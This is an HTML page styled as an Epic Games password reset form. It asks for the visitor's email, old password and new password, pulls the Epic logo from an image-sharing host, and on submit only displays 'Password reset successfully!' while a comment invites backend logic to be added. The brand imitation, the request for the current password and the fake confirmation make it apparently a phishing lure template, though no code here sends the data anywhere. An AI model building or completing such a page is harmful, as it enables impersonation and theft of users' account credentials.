<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Password Reset - Epic Games</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #181818;
            font-family: 'Roboto', sans-serif;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: url('https://example.com/background-image.jpg') no-repeat center center fixed;
            background-size: cover;
        }

        .container {
            background-color: rgba(0, 0, 0, 0.8);
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
            width: 400px;
            text-align: center;
            transition: transform 0.4s ease-in-out;
        }

        .logo img {
            width: 120px;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 20px;
            position: relative;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #444;
            border-radius: 6px;
            background-color: #333;
            color: #fff;
            font-size: 14px;
            outline: none;
        }

        input[type="password"]:focus, input[type="email"]:focus {
            border-color: #007bff;
            box-shadow: 0 0 5px #007bff;
        }

        button {
            background: linear-gradient(90deg, #007bff, #0056b3);
            color: #fff;
            border: none;
            padding: 12px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
            width: 100%;
            margin-top: 20px;
        }

        button:hover {
            background: linear-gradient(90deg, #0056b3, #007bff);
        }

        .requirements {
            margin-top: 15px;
            padding: 15px;
            background-color: #222;
            border-radius: 6px;
        }

        .requirements ul {
            margin: 0;
            padding: 0;
            list-style: none;
            color: #bbb;
        }

        .requirements li {
            margin-bottom: 10px;
        }

        .success-message {
            display: none;
            background-color: #28a745;
            color: white;
            padding: 10px;
            border-radius: 6px;
            margin-top: 20px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://i.ibb.co/PTf4kjw/epic-games-logo.jpg" alt="Epic Games Logo">
        </div>

        <div class="MuiTypography-root MuiTypography-body1 mui-o497ds">
            Enter your email and new password to reset your Epic Games account password.
        </div>

        <form id="password-reset-form">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" placeholder="Enter your email" required>
            </div>

            <div class="form-group">
                <label for="oldPassword">Old Password</label>
                <input type="password" id="oldPassword" name="oldPassword" placeholder="Enter your old password" required>
            </div>

            <div class="form-group">
                <label for="newPassword">New Password</label>
                <input type="password" id="newPassword" name="newPassword" placeholder="Enter your new password" required>
            </div>

            <div class="requirements">
                <strong>Password Requirements:</strong>
                <ul>
                    <li>Must contain at least 7 characters</li>
                    <li>Must include at least 1 letter</li>
                    <li>Must include at least 1 number</li>
                    <li>Must not contain spaces</li>
                </ul>
            </div>

            <button type="submit">Reset Password</button>
        </form>

        <div id="success-message" class="success-message">
            Password reset successfully!
        </div>
    </div>

    <script>
        document.getElementById("password-reset-form").addEventListener("submit", function (e) {
            e.preventDefault();
            // Show loading spinner or transition
            document.getElementById("success-message").style.display = "block";

            // Simulate form submission (add your backend logic here)
            setTimeout(function () {
                document.getElementById("success-message").innerText = "Password reset successful!";
            }, 2000);
        });
    </script>
</body>
</html>
